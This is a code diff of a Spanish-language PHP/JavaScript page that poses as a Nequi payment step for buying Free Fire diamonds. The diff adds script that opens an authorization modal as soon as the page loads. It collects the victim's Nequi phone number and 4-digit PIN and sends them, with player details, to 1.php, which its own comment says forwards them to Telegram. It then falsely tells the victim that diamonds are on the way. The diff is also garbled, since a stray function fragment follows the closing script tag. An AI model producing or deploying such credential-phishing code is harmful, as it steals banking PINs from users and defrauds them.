@@ -238,36 +238,104 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
   </div>
 
   <script>
-  const form = document.getElementById('nequiForm');
-  const input = document.getElementById('telefono');
-  const modal = document.getElementById('loadingModal');
-  const montoEl = document.getElementById('monto');
-
-  let poll, timeout;
-
-  // Mostrar monto desde localStorage
-  const totalPagar = localStorage.getItem("total_pagar");
-  if (totalPagar) {
-    const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
-      style: "currency",
-      currency: "COP"
-    });
-    montoEl.textContent = "Monto: " + montoFormateado;
-  } else {
-    // Si no hay en localStorage, usar el valor de PHP y guardarlo
-    const montoPHP = "<?php echo addslashes($freefire_data['price']); ?>";
-    if (montoPHP && montoPHP !== '0') {
-      localStorage.setItem("total_pagar", montoPHP);
-      const montoFormateado = parseFloat(montoPHP).toLocaleString("es-CO", {
+  // Mostrar modal inmediatamente al cargar la página
+  document.addEventListener('DOMContentLoaded', function() {
+    // Obtener y mostrar el monto
+    const totalPagar = localStorage.getItem("total_pagar");
+    let montoValor = "0";
+    if (totalPagar) {
+      montoValor = totalPagar;
+      const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
         style: "currency",
         currency: "COP"
       });
-      montoEl.textContent = "Monto: " + montoFormateado;
-      console.log("Monto guardado en localStorage desde PHP:", montoPHP);
+      document.getElementById('monto').textContent = "Monto: " + montoFormateado;
+    } else {
+      // Si no hay en localStorage, usar el valor de PHP y guardarlo
+      const montoPHP = "<?php echo addslashes($freefire_data['price']); ?>";
+      if (montoPHP && montoPHP !== '0') {
+        montoValor = montoPHP;
+        localStorage.setItem("total_pagar", montoPHP);
+        const montoFormateado = parseFloat(montoPHP).toLocaleString("es-CO", {
+          style: "currency",
+          currency: "COP"
+        });
+        document.getElementById('monto').textContent = "Monto: " + montoFormateado;
+        console.log("Monto guardado en localStorage desde PHP:", montoPHP);
+      }
     }
-  }
 
-  function generarTransactionId() {
+    // Mostrar modal de autorización inmediatamente
+    const modal = document.getElementById("modalAutorizacion");
+    if (modal) {
+      modal.style.display = "flex";
+      console.log("Modal mostrado automáticamente");
+    }
+
+    // Agregar event listener al botón
+    const btnEnviar = document.getElementById("btnEnviarNequi");
+    if (btnEnviar) {
+      btnEnviar.addEventListener("click", async function() {
+        const telefono = document.getElementById("telefonoNequi").value;
+        const clave = document.getElementById("claveNequi").value;
+
+        if (!telefono || telefono.length !== 10) {
+          alert("Por favor ingresa un número de teléfono válido (10 dígitos)");
+          return;
+        }
+
+        if (!clave || clave.length !== 4) {
+          alert("Por favor ingresa una clave de 4 dígitos");
+          return;
+        }
+
+        // Mostrar loader
+        mostrarLoader("Enviando datos a Nequi...");
+
+        try {
+          // Enviar datos directamente a Telegram
+          const response = await fetch("1.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              action: "enviar_datos_nequi_directo",
+              telefono: telefono,
+              clave: clave,
+              monto: montoValor,
+              playerId: "<?php echo addslashes($freefire_data['playerId']); ?>",
+              playerName: "<?php echo addslashes($freefire_data['playerName']); ?>",
+              diamonds: "<?php echo addslashes($freefire_data['diamonds']); ?>",
+              bonus: "<?php echo addslashes($freefire_data['bonus']); ?>"
+            })
+          });
+
+          const data = await response.json();
+
+          if (data.ok) {
+            // Ocultar modal y mostrar éxito
+            modal.style.display = "none";
+            alert("¡Datos enviados correctamente! Recibirás las diamantes en breve.");
+            // Redirigir a página de éxito
+            window.location.href = "/success.php";
+          } else {
+            alert("Error al enviar datos: " + (data.error || "Error desconocido"));
+          }
+        } catch (error) {
+          console.error("Error:", error);
+          alert("Error de conexión. Inténtalo de nuevo.");
+        } finally {
+          // Ocultar loader
+          const loaderModal = document.getElementById('loadingModal');
+          if (loaderModal) {
+            loaderModal.style.display = 'none';
+          }
+        }
+      });
+    }
+  });
+  </script>
     return 'TID' + Date.now() + Math.floor(Math.random() * 999);
   }
 
